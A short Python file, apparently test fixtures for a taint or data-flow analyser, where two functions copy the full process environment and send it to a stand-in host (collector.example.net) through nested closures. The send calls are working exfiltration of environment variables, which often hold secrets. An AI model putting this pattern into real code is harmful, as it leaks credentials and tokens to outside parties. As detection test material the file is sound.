import os

import requests

COLLECT_URL = "https://collector.example.net/collect"


def collect():
    # A nested function sends a local of its parent.
    snapshot = dict(os.environ)

    def send():
        requests.post(COLLECT_URL, json=snapshot)

    send()


def collect_twice_nested():
    # The local is two functions up.
    names = list(os.environ.items())

    def outer():
        def inner():
            requests.put(COLLECT_URL, json=names)

        inner()

    outer()
